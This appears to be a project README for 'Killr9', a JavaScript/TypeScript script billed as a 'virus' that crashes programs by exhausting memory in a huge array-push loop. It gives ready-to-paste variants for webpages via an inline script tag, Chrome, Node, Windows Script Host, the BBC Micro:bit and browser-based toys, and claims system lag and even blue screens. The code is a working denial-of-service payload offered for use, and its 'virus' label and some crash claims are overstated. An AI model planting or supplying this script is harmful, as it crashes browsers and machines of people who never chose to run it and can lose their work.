# Killr9
A JavaScript/TypeScript virus that will kill virtually anything!

It's killed Chromium-based browsers, Electron Apps, NodeJS instances, Internet Explorer, NetScape Navigator 9, the BBC Micro:bit V2, and more!
<br><br>
You can find a demo at https://themirrazz.github.io/killr9/demopage/
<br><br>
Platforms it has effect on:
* Google Chrome/Chromium-based browsers
* NodeJS
* Windows98 and newer(via WSCRIPT.EXE)
* BBC Micro:bit(MakeCode Editor)
* Internet Explorer
* IEMode in Edge (kills IEChooser at the same time)
* Netscape Navigator
* Google Apps Script



## Killing a program
This will kill most programs that can run JavaScript, especially Chromium-based browsers.
Usually, the raw JavaScript versions will work. But there are some times where the code
may need to be written differently (eg Semi-colon, eval, typescript)



## Killing webpage (inline)
Paste the JS code inside of a script tag.
```html
<script>
  function ohSnap() {
  var corruptable=[]
  for(var i=0;i<(9999999*999999999999999999999);i++) {
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
  }
}

ohSnap()
</script>
```

Newer versions of Chrome require this additoinal code:
```html
<script>
  function ohSnap() {
  var corruptable=[]
  for(var i=0;i<(9999999*999999999999999999999);i++) {
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
  }
}

setInterval(ohSnap)
</script>
```
Please note that this takes 12 seconds to be executed compared to the average of 0-4 seconds on everything except Chrome.
This is because Chrome has now implented an array limit. Its almost like they don't want viruses running on their browser...


## Killing a Windows96 instance(WRT Bin)
Create a WRT bin, like this:
```js
//!wrt
function ohSnap() {
  var corruptable=[]
  for(var i=0;i<(9999999*999999999999999999999);i++) {
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
  }
}

ohSnap()
```

Once it's saved, if you double click it, the entire tab will crash.

## Killing the BBC Micro:bit
Open the makecode editor at https://makecode.microbit.org/, create a project, and paste the typescript in:
```ts
function ohSnap () {
    for (let i = 0; i <= (9999999 * 999999999999999999999) - 1; i++) {
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
    }
}
let corruptable: number[] = []
corruptable = []
ohSnap()
```
Flash your code onto the BBC Micro:bit to watch it die!
You can also find the code in the `killr.ts` file.


NOTE: This code will also completly kill the simulator!

## Killing Windows(Windows ME and higher)

To Kill Windows ME or above, open the MS-DOS prompt. Make sure you have Windows Script Host by running WSCRIPT.EXE. If it shows WSH settings, close them and run `WSCRIPT.EXE path/to/killr.js`.
Your computer will lag, crash, keep the fan on, and depending on the computer and how much RAM is already in use, BSOD(Blue screen of death).

## Killing Windows 98
Killing Windows98 is almost the same as Killing Windows ME. But in Windows 98, WSCRIPT doesn't support `Array.push`, and therefore has to be rewritten, as so:
```js
function ohSnap() {
  var corruptable=[]
  corruptable.push=function(e){
    corruptable[corruptable.length]=e;
    corruptable.length++
  }
  for(var i=0;i<(9999999*999999999999999999999);i++) {
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
  }
}

ohSnap()
```


## Killing HTML5 ByteBeat

ByteBeat removes newlines, so you'll need semi-colons. It'll need to be in a function, also.
```js
(function(){
function ohSnap() {
  var corruptable=[];
  for(var i=0;i<(9999999*999999999999999999999);i++) {
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
  }
}

ohSnap();
})()
```

Even before you press play, the tab will freeze for a little (due to the for loop) and then die do to the code killing it.
It's fun to run while something is playing, because the audio plays until the tab crashes (and it sounds cool, too!)

## Killing Windows93 (Via the terminal)
Paste the killr.js into the WIN93 terminal.
Soon the tab dies.

